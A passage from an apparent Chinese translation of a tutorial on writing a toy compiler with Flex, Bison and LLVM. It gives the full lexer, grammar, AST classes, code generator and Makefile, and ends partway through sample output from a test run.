+<p>我们使用的工具是基于C/C++的。LLVM是基于C++的，我们的这个语言也基于C++，因为C++具有很多面向对象的优点和可以被重用的STL。此外对于C，Lex和Bison都具有那些初看起来令人迷惑的语法，但是我将尽可能的去解释他。我们需要处理的语法非常小，最多就100行，因此它是比较容易理解的。</p>
+<h4>1.3.2 很复杂吗？</h4>
+<p>是或否，这里面有很多的东西你需要了解，甚至多的让人感觉到害怕，但是老实说，其实这些都非常简单，我们同样会使用很多工具分解这些层次的复杂性，并使得这些内容可管理。</p>
+<h4>1.3.3 完成它需要多长时间</h4>
+<p>我们将要完成的编译器花了我三天的时间。但是如果你按“follow me”的方式来完成这个编译器的话，你将会花费更少的时间。如果要全部理解这里面的内容可能会花去稍微长一点的时间，但是你至少应该在一个下午就将整个编译器运行起来。</p>
+<p>好，如果你已经准备好，我们开始吧。</p>
+<p><h2>2、准备开始</h2>
+</p>
+<h3>2.1 构成编译器的最基本的要素</h3>
+<p>一个编译器是由一组有三个到四个组件(还有一些子组件)构成，数据以管道的方式从一个组件输入并流向下一个组件。在我们这个编译器中，可能会用到一些稍微不同的工具。下面这个图展示了我们构造一个编译器的步骤，和每个步骤中将使用的工具。</p>
+<p><img decoding="async" loading="lazy" alt="Compiler Pipeline" src="http://gnuu.org/wp-content/uploads/2009/09/pipeline.png" width="620" height="76" /> </p>
+<p>从上图你可以看到在Linking这一步是灰掉的。我们的语言将不支持编译器的连接(很多的语言都不支持编译器的连接)。在文法分析阶段，我们将使用开源工具Lex，即如今的<a href="http://flex.sourceforge.net/">Flex</a>，文法分析一般都伴随者语法分析，我们使用的语法分析工具将会是Yacc，或者说是<a href="http://www.gnu.org/software/bison/">Bison</a>，最后一旦语义分析完成，我们将遍历我们的抽象语法树，并生成我们的&#8221;bytecode 字节码&#8221;，或&#8221;机器码 matchine code&#8221;。做这一步，我们将使用<a href="http://llvm.org/">LLVM</a>，它能生成快速字节码，我们将使用LLVM的JIT(Just In Tinme)来在我们的机器上编译执行它</p>
+<p>总结一下，步骤如下：</p>
+<ol>
+<li><strong>文法分析用<em>Flex</em></strong>:将数据分隔成一个个的标记token (标示符identifiers，关键字keywords，数字numbers, 中括号brackets, 大括号braces, 等等etc.) </li>
+<li><strong>语法分析用<em>Bison</em></strong>: 在分析标记的时候生成抽象语法树. Bison 将会做掉几乎所有的这些工作, 我们定义好我们的抽象语法树就OK了. </li>
+<li><strong>组装用<em>LLVM</em></strong>: 这里我们将遍历我们的抽象语法树，并未每一个节点生成字节/机器码。 这听起来似乎很疯狂，但是这几乎就是<em>最简单的</em> 一步了. </li>
+</ol>
+<p>在我们开始下一步之前，你应该准备安装好Flex,Bison和LLVM。因为我们马上就要使用到它们。</p>
+<p><h3>2.2 定义我们的语法</h3>
+</p>
+<p>我们语法是我们语言中最核心的部分，我们的语法使用类似标准C的语法，因为这样的语法非常熟悉，而且简单。我们语法的一个典型的例子如下：</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">
+int do_math(int a) {
+  int x = a * 5 + 3
+}
+
+do_math(10)
+</pre>
+<p>看起来很简单。它和C非常相似，但是它没有使用分号做语句的分隔，同时你也会注意到我们的语法中没有return语句。这就是你可以自己实现的部分。</p>
+<p>现在我们还没有任何机制来验证结果。我们将通过检查我们编译之后LLVM打印出的字节码验证我们程序的正确性。</p>
+<p><h2>3、 第一步，使用Flex进行文法分析 </h2>
+</p>
+<p>这是最简单的一步，给定语法之后，我们需要将我们的输入转换一系列内部标记token。如前所述，我们的语法具有非常基础的标记token:标示符identifier ，数字常量(整型和浮点型)，数学运算符号，括号，中括号，我们的文法定义文件称为token.l，它具有一些固定的语法。定义如下：</p>
+<pre>
+%{
+#include <string>
+#include "node.h"
+#include "parser.hpp"
+#define SAVE_TOKEN yylval.string = new std::string(yytext, yyleng)
+#define TOKEN(t) (yylval.token = t)
+extern "C" int yywrap() { }
+%}
+
+%%
+
+[ \t\n]                 ;
+[a-zA-Z_][a-zA-Z0-9_]*  SAVE_TOKEN; return TIDENTIFIER;
+[0-9]+\.[0-9]*          SAVE_TOKEN; return TDOUBLE;
+[0-9]+                  SAVE_TOKEN; return TINTEGER;
+"="                     return TOKEN(TEQUAL);
+"=="                    return TOKEN(TCEQ);
+"!="                    return TOKEN(TCNE);
+"<"                     return TOKEN(TCLT);
+"<="                    return TOKEN(TCLE);
+">"                     return TOKEN(TCGT);
+">="                    return TOKEN(TCGE);
+"("                     return TOKEN(TLPAREN);
+")"                     return TOKEN(TRPAREN);
+"{"                     return TOKEN(TLBRACE);
+"}"                     return TOKEN(TRBRACE);
+"."                     return TOKEN(TDOT);
+","                     return TOKEN(TCOMMA);
+"+"                     return TOKEN(TPLUS);
+"-"                     return TOKEN(TMINUS);
+"*"                     return TOKEN(TMUL);
+"/"                     return TOKEN(TDIV);
+.                       printf("Unknown token!\n"); yyterminate();
+
+%%
+</pre>
+<p>在第一节(译者注：即%{%}中定义的部分)声明了一些特定的C代码。由于Bison不会去访问我门的yytext变量，我们使用宏&#8221;SAVE_TOKEN&#8221;来保证标示符的文本和文本长度是安全的(而不是靠标记本身来保证)。第一个token告诉我们要忽略掉那些空白字符。你会注意到我们有些一些等价性比较的标记和其他。还有一些标记还没有实现，你可以非常自由的将这些标记加到你自己的编译器中去。</p>
+<p>现在我们在这里做的是定义这些标记和他们的符号名。符号(比如TIDENTFIER)将成为我们语法中的终结符。我们只是返回它，我们从未定义它，他们是在什么地方定义的？当然是在bison语法文件中。我们包含的parser.hpp头文件将会被bison所生成，并且里面的所有符号都将被生成，并被我们在这里使用。</p>
+<p>我们对这个token.l运行flex命令，并生成tokens.cpp文件，这个程序将会和我们的语法分析器一起编译并提供yylex()函数来识别这些标记。我们将在稍后运行这个命令，因为现在我们需要从bison那里生成头文件。</p>
+<p><h2>4、第2步 使用Bison进行语法分析</h2>
+</p>
+<p>这是我们工作中最富有挑战性的一部分。生成一个正确的无二义的语法并不是一项简单的工作，要经过很多实践努力。庆幸的是，我们例子中的语法是简单而完整的。在我们实现我们的语法之前，我们需要详细的讲解一下我们的设计。</p>
+<p><h3>4.1、设计AST(抽象语法树)</h3>
+</p>
+<p>语法分析的最终结果是抽象语法树AST，正如我们将看到的，Bison生成抽象语法树的最优工具；我们唯一需要做的事情就是将我们的代码插入到语法中去。</p>
+<p>文本形式字符串，例如&#8221;int x&#8221;代表了我们语言的文本形式，和这个类似，抽象语法树AST则代表了我们语言在内存中的表现形式一样(在语言在组装成而进程码之前)。正因如此，我们要在把这些插入在语法分析中的数据结构首先设计好。这个过程是非常直接的，因为我们为语法中的每个语义单元创建了一个结构。方法声明、方法调用，变量声明，引用，这些都构成了抽象语法树的节点。我们语言的抽象语法树的节点如下图：<br />
+<img decoding="async" loading="lazy" border="0" alt="Our Toy Language AST" src="http://gnuu.org/wp-content/uploads/2009/09/ClassDiagram.png" width="640" height="505" /><br />
+上图的C++代码如下：<br />
+node.h文件</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">
+#include &lt;iostream&gt;
+#include &lt;vector&gt;
+#include &lt;llvm/Value.h&gt;
+
+class CodeGenContext;
+class NStatement;
+class NExpression;
+class NVariableDeclaration;
+
+typedef std::vector&lt;NStatement*&gt; StatementList;
+typedef std::vector&lt;NExpression*&gt; ExpressionList;
+typedef std::vector&lt;NVariableDeclaration*&gt; VariableList;
+
+class Node {
+public:
+    virtual ~Node() {}
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context) { }
+};
+
+class NExpression : public Node {
+};
+
+class NStatement : public Node {
+};
+
+class NInteger : public NExpression {
+public:
+    long long value;
+    NInteger(long long value) : value(value) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NDouble : public NExpression {
+public:
+    double value;
+    NDouble(double value) : value(value) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NIdentifier : public NExpression {
+public:
+    std::string name;
+    NIdentifier(const std::string&amp; name) : name(name) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NMethodCall : public NExpression {
+public:
+    const NIdentifier&amp; id;
+    ExpressionList arguments;
+    NMethodCall(const NIdentifier&amp; id, ExpressionList&amp; arguments) :
+        id(id), arguments(arguments) { }
+    NMethodCall(const NIdentifier&amp; id) : id(id) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NBinaryOperator : public NExpression {
+public:
+    int op;
+    NExpression&amp; lhs;
+    NExpression&amp; rhs;
+    NBinaryOperator(NExpression&amp; lhs, int op, NExpression&amp; rhs) :
+        lhs(lhs), rhs(rhs), op(op) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NAssignment : public NExpression {
+public:
+    NIdentifier&amp; lhs;
+    NExpression&amp; rhs;
+    NAssignment(NIdentifier&amp; lhs, NExpression&amp; rhs) :
+        lhs(lhs), rhs(rhs) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NBlock : public NExpression {
+public:
+    StatementList statements;
+    NBlock() { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NExpressionStatement : public NStatement {
+public:
+    NExpression&amp; expression;
+    NExpressionStatement(NExpression&amp; expression) :
+        expression(expression) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NVariableDeclaration : public NStatement {
+public:
+    const NIdentifier&amp; type;
+    NIdentifier&amp; id;
+    NExpression *assignmentExpr;
+    NVariableDeclaration(const NIdentifier&amp; type, NIdentifier&amp; id) :
+        type(type), id(id) { }
+    NVariableDeclaration(const NIdentifier&amp; type, NIdentifier&amp; id, NExpression *assignmentExpr) :
+        type(type), id(id), assignmentExpr(assignmentExpr) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+class NFunctionDeclaration : public NStatement {
+public:
+    const NIdentifier&amp; type;
+    const NIdentifier&amp; id;
+    VariableList arguments;
+    NBlock&amp; block;
+    NFunctionDeclaration(const NIdentifier&amp; type, const NIdentifier&amp; id,
+            const VariableList&amp; arguments, NBlock&amp; block) :
+        type(type), id(id), arguments(arguments), block(block) { }
+    virtual llvm::Value* codeGen(CodeGenContext&amp; context);
+};
+
+</pre>
+<p>非常的清晰明了，我们省略了getter和setter方法，这里只列出了共有成员；这些类也不需要影藏私有数据，并省略了codeGen方法。在我们导出AST成LLVM的字节码时，就需要使用到这个方法。</p>
+<p><h3>4.2、Bison介绍</h3>
+</p>
+<p>bison的语法定义文件同样是由这些标记构成的最复杂的部分。这并不是说技术上有多复杂，但是我也会花一些时间来讨论一下Bison的语法细节，好，现在让我们立刻来熟悉一下Bison的语法。我们将使用基于类似于BNF的语法，使用定义的好终结符和非终结符来组成我们有效的每一个语句和表达式(这些语句和表达式就代表我们之前定义的AST节点)。例如：</p>
+<pre>
+if_stmt : IF '(' condition ')' block { /* do stuff when this rule is encountered */ }
+        | IF '(' condition ')'       { ... }
+        ;
+</pre>
+<p>在上面例子中，我们定义了一个if语句(如果我们支持if语句话)，它和BNF不同之处在于，每个语法后面都跟了一系列动作(在'{&#8216;和&#8217;}&#8217;之间的内容)。这个动作将在此条语法被识别(译者注：归约)的时候被执行。这个过程将会递归地按从叶子符号到根节点符号的次序执行，在这个过程，每一个非终结符最终会被合并为一棵大的语法树。你将会看到的&#8217;$$&#8217;符号代表着当前树的跟节点(译者注：&#8217;$$&#8217;代表本条语法规则中冒号左边的部分的语义内容)。此外&#8217;$1&#8217;代表了本条规则叶子中的第一个符号(译者注：&#8217;$1&#8217;代表了本条语法规则冒号右边的内容，$1代表冒号右边的第一个符号的语义值)。在上面的例子中，当&#8217;condition&#8217;有效时我们将会把$3 赋值给$$。这个例子可以解释如何将我们AST和语法规则关联起来。我们将在每一条规则中通常赋值一个节点到$$，最后这些规则会合并成一个大的抽象语法树。Bison的部分是我们语言最复杂的部分，你需要花一点时间去理解它。此外到此为止，你还没有看到完整的代码。下面就是完整的Bison部分的代码：<br />
+parser.y</p>
+<pre>
+%{
+    #include "node.h"
+    NBlock *programBlock; /* the top level root node of our final AST */
+
+    extern int yylex();
+    void yyerror(const char *s) { printf("ERROR: %s\n", s); }
+%}
+
+/* Represents the many different ways we can access our data */
+%union {
+    Node *node;
+    NBlock *block;
+    NExpression *expr;
+    NStatement *stmt;
+    NIdentifier *ident;
+    NVariableDeclaration *var_decl;
+    std::vector<NVariableDeclaration*> *varvec;
+    std::vector<NExpression*> *exprvec;
+    std::string *string;
+    int token;
+}
+
+/* Define our terminal symbols (tokens). This should
+   match our tokens.l lex file. We also define the node type
+   they represent.
+ */
+%token <string> TIDENTIFIER TINTEGER TDOUBLE
+%token <token> TCEQ TCNE TCLT TCLE TCGT TCGE TEQUAL
+%token <token> TLPAREN TRPAREN TLBRACE TRBRACE TCOMMA TDOT
+%token <token> TPLUS TMINUS TMUL TDIV
+
+/* Define the type of node our nonterminal symbols represent.
+   The types refer to the %union declaration above. Ex: when
+   we call an ident (defined by union type ident) we are really
+   calling an (NIdentifier*). It makes the compiler happy.
+ */
+%type <ident> ident
+%type <expr> numeric expr
+%type <varvec> func_decl_args
+%type <exprvec> call_args
+%type <block> program stmts block
+%type <stmt> stmt var_decl func_decl
+%type <token> comparison
+
+/* Operator precedence for mathematical operators */
+%left TPLUS TMINUS
+%left TMUL TDIV
+
+%start program
+
+%%
+
+program : stmts { programBlock = $1; }
+        ;
+
+stmts : stmt { $$ = new NBlock(); $$->statements.push_back($<stmt>1); }
+      | stmts stmt { $1->statements.push_back($<stmt>2); }
+      ;
+
+stmt : var_decl | func_decl
+     | expr { $$ = new NExpressionStatement(*$1); }
+     ;
+
+block : TLBRACE stmts TRBRACE { $$ = $2; }
+      | TLBRACE TRBRACE { $$ = new NBlock(); }
+      ;
+
+var_decl : ident ident { $$ = new NVariableDeclaration(*$1, *$2); }
+         | ident ident TEQUAL expr { $$ = new NVariableDeclaration(*$1, *$2, $4); }
+         ;
+
+func_decl : ident ident TLPAREN func_decl_args TRPAREN block
+            { $$ = new NFunctionDeclaration(*$1, *$2, *$4, *$6); delete $4; }
+          ;
+
+func_decl_args : /*blank*/  { $$ = new VariableList(); }
+          | var_decl { $$ = new VariableList(); $$->push_back($<var_decl>1); }
+          | func_decl_args TCOMMA var_decl { $1->push_back($<var_decl>3); }
+          ;
+
+ident : TIDENTIFIER { $$ = new NIdentifier(*$1); delete $1; }
+      ;
+
+numeric : TINTEGER { $$ = new NInteger(atol($1->c_str())); delete $1; }
+        | TDOUBLE { $$ = new NDouble(atof($1->c_str())); delete $1; }
+        ;
+
+expr : ident TEQUAL expr { $$ = new NAssignment(*$<ident>1, *$3); }
+     | ident TLPAREN call_args TRPAREN { $$ = new NMethodCall(*$1, *$3); delete $3; }
+     | ident { $<ident>$ = $1; }
+     | numeric
+     | expr comparison expr { $$ = new NBinaryOperator(*$1, $2, *$3); }
+     | TLPAREN expr TRPAREN { $$ = $2; }
+     ;
+
+call_args : /*blank*/  { $$ = new ExpressionList(); }
+          | expr { $$ = new ExpressionList(); $$->push_back($1); }
+          | call_args TCOMMA expr  { $1->push_back($3); }
+          ;
+
+comparison : TCEQ | TCNE | TCLT | TCLE | TCGT | TCGE
+           | TPLUS | TMINUS | TMUL | TDIV
+           ;
+
+%%
+</pre>
+<p><h2>5、生成Flex和Bison代码</h2>
+</p>
+<p>现在我们有了Flex的token.l文件和Bison的parser.y文件。我们需要将这两个文件传递给工具，并由工具来生成c++代码文件。注意Bison同时会为Flex生成parser.hpp头文件；这样做是通过-d开关实现的，这个开关是的我们的标记声明和源文件分开，这样就是的我们可以让这些token标记被其他的程序使用。下面的命令创建parser.cpp，parser.hpp和tokens.cpp源文件。</p>
+<pre>
+$ bison -d -o parser.cpp parser.y
+$ lex -o tokens.cpp tokens.l
+</pre>
+<p>如果上述工作都没有出错的话，我们现在位置已经完成了我们编译器工作总量的2/3。如果你现在想测试一下我们的代码，你可以编译一个简单的main.cpp程序：</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">
+#include &lt;iostream&gt;
+#include &quot;node.h&quot;
+extern NBlock* programBlock;
+extern int yyparse();
+
+int main(int argc, char **argv)
+{
+    yyparse();
+    std::cout &lt;&lt; programBlock &lt;&lt; endl;
+    return 0;
+}
+</pre>
+<p>你可以编译这些文件：<br />
+$ g++ -o parser parser.cpp tokens.cpp main.cpp<br />
+现在你需要安装LLVM了，因为llvm::Value被node.h引用了。如果你不想这么做，只是想测试一下Flex和Bison部分，你可以注释掉node.h中codeGen()方法。</p>
+<p>如果上述工作都完成了，你现在将有一个语法分析器，这个语法分析器将从标准输入读入，并打出在内存中代表抽象语法树跟节点的内存非零地址。</p>
+<h2>6、组装AST和LLVM</h2>
+<p>编译器的下一步很自然地是应该将AST转换成机器码。这意味着将每一个语义节点转换成等价的机器指令。LLVM将帮助我们把这步变得非常简单，因为LLVM将真实的指令抽象成类似AST的指令。这意味着我们真正要做的事就是将AST转换成抽象指令。<br />
+你可以想象这个过程是从抽象语法树的根节点开始遍历每一个树上节点并产生字节码的过程。现在就是使用我们在Node中定义的codeGen方法的时候了。例如，当我们遍历NBlock代码的时候(语义上NBlock代表一组我们语言的语句的集合)，我们将调用列表中每条语句的codeGen方法。上面步骤代码类似如下的形式：</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">
+Value* NBlock::codeGen(CodeGenContext&amp; context)
+{
+    StatementList::const_iterator it;
+    Value *last = NULL;
+    for (it = statements.begin(); it != statements.end(); it++) {
+        std::cout &lt;&lt; &quot;Generating code for &quot; &lt;&lt; typeid(**it).name() &lt;&lt; endl;
+        last = (**it).codeGen(context);
+    }
+    std::cout &lt;&lt; &quot;Creating block&quot; &lt;&lt; endl;
+    return last;
+}
+</pre>
+<p>我们将实现抽象语法树上所有节点的codeGen方法，然后在向下遍历树的时候调用它，并隐式的遍历我们整个抽象语法树。在这个过程中，我们在CodeGenContext类来告诉我们生成字节码的位置。</p>
+<p><h3> 6.1、关于LLVM要注意的一些信息</h3>
+</p>
+<p>LLVM最大的一个确定就是，你很难找到LLVM的相关文档。在线手册、教程、或其他的文档都没有及时的得到相关维护，这些文档大部分都是过期的文档。除非你去深入研究，否则你很难找到关于C++ API的信息。如果你自己安装LLVM，docs<br />
+是最新的文档。</p>
+<p>我发现最好学习LLVM的方法就是通过LLVM的例子去学习。在LLVM的压缩包的&#8217;example&#8217;目录下有很多快速生成字节码的例子。在<a href="http://llvm.org/demo/">LLVM demo site</a>上可以将C做输入，然后生成C++ API的例子。以这些例子提供的方法，我找到了类似于int x = 5 ;的指令的生成方法。我使用这些工具实现大部分的节点。</p>
+<p>关于LLVM的问题描述到此为止，我将在下面罗列出codegen.h和codegen.cpp的源代码</p>
+<p>codegen.h的内容。</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">
+#include &lt;stack&gt;
+#include &lt;llvm/Module.h&gt;
+#include &lt;llvm/Function.h&gt;
+#include &lt;llvm/PassManager.h&gt;
+#include &lt;llvm/CallingConv.h&gt;
+#include &lt;llvm/Bitcode/ReaderWriter.h&gt;
+#include &lt;llvm/Analysis/Verifier.h&gt;
+#include &lt;llvm/Assembly/PrintModulePass.h&gt;
+#include &lt;llvm/Support/IRBuilder.h&gt;
+#include &lt;llvm/ModuleProvider.h&gt;
+#include &lt;llvm/ExecutionEngine/GenericValue.h&gt;
+#include &lt;llvm/ExecutionEngine/JIT.h&gt;
+#include &lt;llvm/Support/raw_ostream.h&gt;
+
+using namespace llvm;
+
+class NBlock;
+
+class CodeGenBlock {
+public:
+    BasicBlock *block;
+    std::map&lt;std::string , Value*&gt; locals;
+};
+
+class CodeGenContext {
+    std::stack&lt;codegenblock  *&gt; blocks;
+    Function *mainFunction;
+
+public:
+    Module *module;
+    CodeGenContext() { module = new Module(&quot;main&quot;); }
+
+    void generateCode(NBlock&amp; root);
+    GenericValue runCode();
+    std::map&lt;std::string , Value*&gt;&amp; locals() { return blocks.top()-&gt;locals; }
+    BasicBlock *currentBlock() { return blocks.top()-&gt;block; }
+    void pushBlock(BasicBlock *block) { blocks.push(new CodeGenBlock()); blocks.top()-&gt;block = block; }
+    void popBlock() { CodeGenBlock *top = blocks.top(); blocks.pop(); delete top; }
+};
+</pre>
+<p>codegen.cpp的内容。</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">
+#include &quot;node.h&quot;
+#include &quot;codegen.h&quot;
+#include &quot;parser.hpp&quot;
+
+using namespace std;
+
+/* Compile the AST into a module */
+void CodeGenContext::generateCode(NBlock&amp; root)
+{
+    std::cout &lt;&lt; &quot;Generating code...\n&quot;;
+
+    /* Create the top level interpreter function to call as entry */
+    vector&lt;const type*&gt; argTypes;
+    FunctionType *ftype = FunctionType::get(Type::VoidTy, argTypes, false);
+    mainFunction = Function::Create(ftype, GlobalValue::InternalLinkage, &quot;main&quot;, module);
+    BasicBlock *bblock = BasicBlock::Create(&quot;entry&quot;, mainFunction, 0);
+
+    /* Push a new variable/block context */
+    pushBlock(bblock);
+    root.codeGen(*this); /* emit bytecode for the toplevel block */
+    ReturnInst::Create(bblock);
+    popBlock();
+
+    /* Print the bytecode in a human-readable format
+       to see if our program compiled properly
+     */
+    std::cout &lt;&lt; &quot;Code is generated.\n&quot;;
+    PassManager pm;
+    pm.add(createPrintModulePass(&amp;outs()));
+    pm.run(*module);
+}
+
+/* Executes the AST by running the main function */
+GenericValue CodeGenContext::runCode() {
+    std::cout &lt;&lt; &quot;Running code...\n&quot;;
+    ExistingModuleProvider *mp = new ExistingModuleProvider(module);
+    ExecutionEngine *ee = ExecutionEngine::create(mp, false);
+    vector&lt;genericvalue&gt; noargs;
+    GenericValue v = ee-&gt;runFunction(mainFunction, noargs);
+    std::cout &lt;&lt; &quot;Code was run.\n&quot;;
+    return v;
+}
+
+/* Returns an LLVM type based on the identifier */
+static const Type *typeOf(const NIdentifier&amp; type)
+{
+    if (type.name.compare(&quot;int&quot;) == 0) {
+        return Type::Int64Ty;
+    }
+    else if (type.name.compare(&quot;double&quot;) == 0) {
+        return Type::FP128Ty;
+    }
+    return Type::VoidTy;
+}
+
+/* -- Code Generation -- */
+
+Value* NInteger::codeGen(CodeGenContext&amp; context)
+{
+    std::cout &lt;&lt; &quot;Creating integer: &quot; &lt;&lt; value &lt;&lt; endl;
+    return ConstantInt::get(Type::Int64Ty, value, true);
+}
+
+Value* NDouble::codeGen(CodeGenContext&amp; context)
+{
+    std::cout &lt;&lt; &quot;Creating double: &quot; &lt;&lt; value &lt;&lt; endl;
+    return ConstantFP::get(Type::FP128Ty, value);
+}
+
+Value* NIdentifier::codeGen(CodeGenContext&amp; context)
+{
+    std::cout &lt;&lt; &quot;Creating identifier reference: &quot; &lt;&lt; name &lt;&lt; endl;
+    if (context.locals().find(name) == context.locals().end()) {
+        std::cerr &lt;&lt; &quot;undeclared variable &quot; &lt;&lt; name &lt;&lt; endl;
+        return NULL;
+    }
+    return new LoadInst(context.locals()[name], &quot;&quot;, false, context.currentBlock());
+}
+
+Value* NMethodCall::codeGen(CodeGenContext&amp; context)
+{
+    Function *function = context.module-&gt;getFunction(id.name.c_str());
+    if (function == NULL) {
+        std::cerr &lt;&lt; &quot;no such function &quot; &lt;&lt; id.name &lt;&lt; endl;
+    }
+    std::vector&lt;value *&gt; args;
+    ExpressionList::const_iterator it;
+    for (it = arguments.begin(); it != arguments.end(); it++) {
+        args.push_back((**it).codeGen(context));
+    }
+    CallInst *call = CallInst::Create(function, args.begin(), args.end(), &quot;&quot;, context.currentBlock());
+    std::cout &lt;&lt; &quot;Creating method call: &quot; &lt;&lt; id.name &lt;&lt; endl;
+    return call;
+}
+
+Value* NBinaryOperator::codeGen(CodeGenContext&amp; context)
+{
+    std::cout &lt;&lt; &quot;Creating binary operation &quot; &lt;&lt; op &lt;&lt; endl;
+    Instruction::BinaryOps instr;
+    switch (op) {
+        case TPLUS:     instr = Instruction::Add; goto math;
+        case TMINUS:    instr = Instruction::Sub; goto math;
+        case TMUL:      instr = Instruction::Mul; goto math;
+        case TDIV:      instr = Instruction::SDiv; goto math;
+
+        /* TODO comparison */
+    }
+
+    return NULL;
+math:
+    return BinaryOperator::Create(instr, lhs.codeGen(context),
+        rhs.codeGen(context), &quot;&quot;, context.currentBlock());
+}
+
+Value* NAssignment::codeGen(CodeGenContext&amp; context)
+{
+    std::cout &lt;&lt; &quot;Creating assignment for &quot; &lt;&lt; lhs.name &lt;&lt; endl;
+    if (context.locals().find(lhs.name) == context.locals().end()) {
+        std::cerr &lt;&lt; &quot;undeclared variable &quot; &lt;&lt; lhs.name &lt;&lt; endl;
+        return NULL;
+    }
+    return new StoreInst(rhs.codeGen(context), context.locals()[lhs.name], false, context.currentBlock());
+}
+
+Value* NBlock::codeGen(CodeGenContext&amp; context)
+{
+    StatementList::const_iterator it;
+    Value *last = NULL;
+    for (it = statements.begin(); it != statements.end(); it++) {
+        std::cout &lt;&lt; &quot;Generating code for &quot; &lt;&lt; typeid(**it).name() &lt;&lt; endl;
+        last = (**it).codeGen(context);
+    }
+    std::cout &lt;&lt; &quot;Creating block&quot; &lt;&lt; endl;
+    return last;
+}
+
+Value* NExpressionStatement::codeGen(CodeGenContext&amp; context)
+{
+    std::cout &lt;&lt; &quot;Generating code for &quot; &lt;&lt; typeid(expression).name() &lt;&lt; endl;
+    return expression.codeGen(context);
+}
+
+Value* NVariableDeclaration::codeGen(CodeGenContext&amp; context)
+{
+    std::cout &lt;&lt; &quot;Creating variable declaration &quot; &lt;&lt; type.name &lt;&lt; &quot; &quot; &lt;&lt; id.name &lt;&lt; endl;
+    AllocaInst *alloc = new AllocaInst(typeOf(type), id.name.c_str(), context.currentBlock());
+    context.locals()[id.name] = alloc;
+    if (assignmentExpr != NULL) {
+        NAssignment assn(id, *assignmentExpr);
+        assn.codeGen(context);
+    }
+    return alloc;
+}
+
+Value* NFunctionDeclaration::codeGen(CodeGenContext&amp; context)
+{
+    vector&lt;const type*&gt; argTypes;
+    VariableList::const_iterator it;
+    for (it = arguments.begin(); it != arguments.end(); it++) {
+        argTypes.push_back(typeOf((**it).type));
+    }
+    FunctionType *ftype = FunctionType::get(typeOf(type), argTypes, false);
+    Function *function = Function::Create(ftype, GlobalValue::InternalLinkage, id.name.c_str(), context.module);
+    BasicBlock *bblock = BasicBlock::Create(&quot;entry&quot;, function, 0);
+
+    context.pushBlock(bblock);
+
+    for (it = arguments.begin(); it != arguments.end(); it++) {
+        (**it).codeGen(context);
+    }
+
+    block.codeGen(context);
+    ReturnInst::Create(bblock);
+
+    context.popBlock();
+    std::cout &lt;&lt; &quot;Creating function: &quot; &lt;&lt; id.name &lt;&lt; endl;
+    return function;
+}
+</pre>
+<p>上述罗列很多的代码，然而这部份代码的含义需要你自己去探索。我在这里只会提及一下你需要注意的内容：</p>
+<ul>
+<li>我们在CodeGenContext类中使用一个语句块的栈来保存最后进入的block(因为语句都被增加到blocks中)
+<li>我们同样用个堆栈来保存每组语句块中的<a href="http://en.wikipedia.org/wiki/Symbol_table">符号表</a>  </li>
+<li>我们设计的语言只会知道他当前范围内的内容.要支持“全局”上下的做法，你必须向上搜索整个堆栈中每一个语句块，知道你最后发现你匹配的符号(现在我们只是简单地搜索堆栈中最顶层的符号表)。 </li>
+<li>在我们进入一个语句块之前，我们需要将语句块压栈，离开语句块时将语句块出栈 </li>
+</ul>
+<p>剩下的内容都LLVM相关了，在这个主题上我并不是专家。但是迄今为止，我们已经有了编译和运行我们语言的所有代码。</p>
+<p><h2>7、编译和运行我们的语言</h2>
+</p>
+<p><h3>7.1、编译我们的语言</h3>
+</p>
+<p>我们已经有了代码，现在我们怎么运行它？LLVM有着非常复杂的联接link，幸运的是，如果你是自己安装的LLVM，那么你就应该有一个llvm-config二进制程序，这个程序返回你需要的所有编译和联接选项。<br />
+我们也要同时更新我们的main.cpp的内容使之可以编译和运行我们的代码，这次我们main.cpp的内容如下：</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">
+#include &lt;iostream&gt;
+#include &quot;codegen.h&quot;
+#include &quot;node.h&quot;
+
+using namespace std;
+
+extern int yyparse();
+extern NBlock* programBlock;
+
+int main(int argc, char **argv)
+{
+    yyparse();
+    std::cout &lt;&lt; programBlock &lt;&lt; endl;
+
+    CodeGenContext context;
+    context.generateCode(*programBlock);
+    context.runCode();
+
+    return 0;
+}
+</pre>
+<p>现在我们需要这样来编译这些代码<br />
+$ g++ -o parser <code data-enlighter-language="raw" class="EnlighterJSRAW">llvm-config --libs core jit native --cxxflags --ldflags</code> *.cpp<br />
+你也可以编写一个Makefile来进行编译</p>
+<pre>
+all: parser
+
+clean:
+	rm parser.cpp parser.hpp parser tokens.cpp
+
+parser.cpp: parser.y
+	bison -d -o $@ $^
+
+parser.hpp: parser.cpp
+
+tokens.cpp: tokens.l parser.hpp
+	lex -o $@ $^
+
+parser: parser.cpp codegen.cpp main.cpp tokens.cpp
+	g++ -o $@ <code data-enlighter-language="raw" class="EnlighterJSRAW">llvm-config --libs core jit native --cxxflags --ldflags</code> *.cpp
+</pre>
+<p><h3>7.2、运行我们的语言</h3>
+</p>
+<p>假设上述所有工作都圆满完成，那么现在你将有一个名为parser的二进制程序。运行它，还记得我们那个典型例子吗？让我们看看我们的编译器工作的如何。</p>
+<pre>
+$ echo 'int do_math(int a) { int x = a * 5 + 3 } do_math(10)' | ./parser
+0x100a00f10
+Generating code...
+Generating code for 20NFunctionDeclaration
+Creating variable declaration int a
+Generating code for 20NVariableDeclaration
+Creating variable declaration int x
+Creating assignment for x
+Creating binary operation 276
+Creating binary operation 274
+Creating integer: 3
+Creating integer: 5
+Creating identifier reference: a
+Creating block
+Creating function: do_math
+Generating code for 20NExpressionStatement
+Generating code for 11NMethodCall
+Creating integer: 10
+Creating method call: do_math
